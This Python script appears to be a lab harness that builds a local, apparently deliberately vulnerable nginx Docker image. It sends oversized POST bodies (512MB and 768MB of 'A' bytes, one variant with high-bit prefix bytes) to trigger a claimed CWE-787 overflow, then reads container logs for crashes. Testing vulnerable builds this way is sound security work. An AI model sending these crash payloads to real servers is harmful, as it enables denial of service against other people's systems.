#!/usr/bin/env python3

import socket
import time
import subprocess
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama for terminal colors
init()

def log_message(message, level="INFO", color=None):
    """Log a message with timestamp, level and color"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    colors = {
        "INFO": Fore.BLUE,
        "DEBUG": Fore.CYAN,
        "SUCCESS": Fore.GREEN,
        "ERROR": Fore.RED,
        "WARNING": Fore.YELLOW
    }
    
    color = color or colors.get(level, Fore.WHITE)
    print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")

def print_banner():
    """Print a cool banner"""
    banner = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════╗
║                                                                ║
║  {Fore.YELLOW}NGINX CWE-787 BUFFER OVERFLOW EXPLOIT TESTER{Fore.RED}           ║
║                                                                ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def build_docker():
    """Build the Docker image"""
    log_message("Building Docker image...", "INFO")
    try:
        subprocess.run(["docker", "build", "-t", "nginx-cwe787", "."], check=True, capture_output=True)
        log_message("✓ Docker image built successfully", "SUCCESS")
        return True
    except subprocess.CalledProcessError as e:
        log_message(f"✗ Error building Docker image: {e}", "ERROR")
        return False

def start_container():
    """Start the Docker container"""
    log_message("Starting container...", "INFO")
    try:
        # Stop any existing containers
        subprocess.run(["docker", "ps", "-q", "--filter", "ancestor=nginx-cwe787"], capture_output=True)
        subprocess.run(["docker", "stop", "$(docker ps -q --filter ancestor=nginx-cwe787)"], shell=True, capture_output=True)
        subprocess.run(["docker", "rm", "$(docker ps -a -q --filter ancestor=nginx-cwe787)"], shell=True, capture_output=True)
        
        # Start new container
        result = subprocess.run(
            ["docker", "run", "-d", "-p", "80:80", "nginx-cwe787"],
            capture_output=True,
            text=True
        )
        container_id = result.stdout.strip()
        
        # Wait for Nginx to start
        time.sleep(5)
        log_message(f"✓ Container started with ID: {container_id}", "SUCCESS")
        return container_id
    except Exception as e:
        log_message(f"✗ Error starting container: {e}", "ERROR")
        return None

def get_container_logs(container_id):
    """Get container logs"""
    try:
        result = subprocess.run(
            ["docker", "logs", container_id],
            capture_output=True,
            text=True
        )
        return result.stdout
    except Exception as e:
        log_message(f"✗ Error getting logs: {e}", "ERROR")
        return None

def check_container_status(container_id):
    """Check if container is still running and get detailed status"""
    try:
        # Get container status
        status = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Status}}", container_id],
            capture_output=True,
            text=True
        ).stdout.strip()
        
        # Get process status inside container
        processes = subprocess.run(
            ["docker", "exec", container_id, "ps", "aux"],
            capture_output=True,
            text=True
        ).stdout
        
        # Get memory usage
        memory = subprocess.run(
            ["docker", "exec", container_id, "free", "-m"],
            capture_output=True,
            text=True
        ).stdout
        
        log_message(f"Container Status: {status}", "DEBUG")
        log_message("Process Status:", "DEBUG")
        print(f"{Fore.CYAN}{processes}{Style.RESET_ALL}")
        log_message("Memory Usage:", "DEBUG")
        print(f"{Fore.CYAN}{memory}{Style.RESET_ALL}")
        
        return status == "running"
    except:
        return False

def create_overflow_payload(size, exploit_type=1):
    """Create a payload that will trigger the buffer overflow"""
    if exploit_type == 1:
        # First exploit: Simple size overflow
        overflow_size = size * 2
        payload = b"A" * overflow_size
    else:
        # Second exploit: Complex conditional overflow
        # Create a payload that will maximize the multiplier
        # by setting high bits in the first 8 bytes
        overflow_size = size * 2
        payload = bytearray(overflow_size)
        
        # Set high bits in first 8 bytes to maximize multiplier
        for i in range(8):
            payload[i] = 0xFF  # All bits set to 1
        
        # Fill rest with 'A' to trigger the second condition
        for i in range(8, overflow_size):
            payload[i] = ord('A')
            
        payload = bytes(payload)
    return payload

def exploit(host="localhost", port=80, buffer_size=1024, exploit_type=1):
    """Exploit the CWE-787 vulnerability in ngx_recv.c"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        request = b"POST / HTTP/1.1\r\n"
        request += b"Host: " + host.encode() + b"\r\n"
        request += b"Content-Type: application/octet-stream\r\n"
        
        payload = create_overflow_payload(buffer_size, exploit_type)
        request += b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n"
        request += payload
        
        log_message(f"Sending payload of {len(payload)} bytes for exploit type {exploit_type}...", "DEBUG")
        if exploit_type == 2:
            log_message("Using complex payload with high bits and 'A' pattern", "DEBUG")
        
        # Set socket options to force immediate processing
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(request))
        
        # Send in chunks to force processing
        chunk_size = 8192
        for i in range(0, len(request), chunk_size):
            chunk = request[i:i + chunk_size]
            s.send(chunk)
            time.sleep(0.1)  # Small delay between chunks
        
        try:
            response = s.recv(4096)
            if response:
                if b"500" in response or b"502" in response:
                    log_message("✓ Server returned error - Possible exploit success!", "SUCCESS")
                elif b"200" in response:
                    log_message("⚠ Server returned 200 OK - Exploit may have failed", "WARNING")
            else:
                log_message("✓ Server did not respond - Possible exploit success!", "SUCCESS")
        except socket.error as e:
            log_message(f"✓ Socket error (possible exploit success): {e}", "SUCCESS")
        
        s.close()
        
    except Exception as e:
        log_message(f"✗ Exploit error: {e}", "ERROR")
        return False
    
    return True

def main():
    print_banner()
    
    # Use the crash size and 50% larger
    crash_size = 536870912  # 512MB (size that crashed)
    buffer_sizes = [crash_size, crash_size + (crash_size // 2)]  # 512MB and 768MB
    
    log_message("Starting CWE-787 exploit test", "INFO")
    
    # Store results for summary
    results = []
    
    # Test both exploit types
    for exploit_type in [1, 2]:
        log_message(f"\n{'='*50}", "INFO")
        log_message(f"Testing Exploit Type {exploit_type}", "INFO")
        log_message(f"{'='*50}", "INFO")
        
        for size in buffer_sizes:
            log_message(f"\nTesting buffer size: {size} bytes ({size/1024/1024:.0f}MB)", "INFO")
            
            # Build and start fresh container for each test
            if not build_docker():
                log_message("Failed to build Docker image. Aborting.", "ERROR")
                return
            
            container_id = start_container()
            if not container_id:
                log_message("Failed to start container. Aborting.", "ERROR")
                return
            
            try:
                if exploit("localhost", 80, size, exploit_type):
                    log_message(f"✓ Test completed for buffer size {size}", "SUCCESS")
                else:
                    log_message(f"✗ Test failed for buffer size {size}", "ERROR")
                
                # Check container status and logs
                if not check_container_status(container_id):
                    log_message("✓ Container crashed - Exploit successful!", "SUCCESS")
                    logs = get_container_logs(container_id)
                    if logs:
                        log_message("Container logs:", "DEBUG")
                        print(f"{Fore.CYAN}{logs}{Style.RESET_ALL}")
                        
                        # Check for specific crash signals
                        crash_info = {
                            "type": exploit_type,
                            "size": size,
                            "signal": None,
                            "reason": None,
                            "worker": None
                        }
                        
                        if "signal 6" in logs:
                            crash_info["signal"] = "SIGABRT (6)"
                            crash_info["reason"] = "Heap corruption detected"
                            # Extract worker process number
                            for line in logs.split('\n'):
                                if "worker process" in line and "exited" in line:
                                    crash_info["worker"] = line.split()[3]
                                    break
                        
                        results.append(crash_info)
                else:
                    logs = get_container_logs(container_id)
                    if logs:
                        log_message("Container logs:", "DEBUG")
                        print(f"{Fore.CYAN}{logs}{Style.RESET_ALL}")
                        
                        # Check for memory issues even if container didn't crash
                        if "malloc" in logs and "invalid" in logs:
                            crash_info = {
                                "type": exploit_type,
                                "size": size,
                                "signal": "Memory Error",
                                "reason": "Invalid memory allocation",
                                "worker": None
                            }
                            results.append(crash_info)
                
            finally:
                # Clean up container after each test
                log_message("Cleaning up container...", "INFO")
                subprocess.run(["docker", "stop", container_id], capture_output=True)
                subprocess.run(["docker", "rm", container_id], capture_output=True)
            
            time.sleep(2)  # Small delay between tests
    
    # Print summary
    print(f"\n{Fore.YELLOW}{'='*50}")
    print("EXPLOIT TEST SUMMARY")
    print(f"{'='*50}{Style.RESET_ALL}")
    
    if not results:
        print(f"{Fore.GREEN}No crashes detected in any test{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Found {len(results)} crashes or memory issues:{Style.RESET_ALL}")
        for crash in results:
            print(f"\n{Fore.YELLOW}Exploit Type {crash['type']}:")
            print(f"Buffer Size: {crash['size']} bytes ({crash['size']/1024/1024:.0f}MB)")
            if crash['signal']:
                print(f"Crash Signal: {crash['signal']}")
                print(f"Reason: {crash['reason']}")
            if crash['worker']:
                print(f"Worker Process: {crash['worker']}")
            print(f"{Style.RESET_ALL}")
    
    log_message("Test finished", "INFO")

if __name__ == "__main__":
    main() 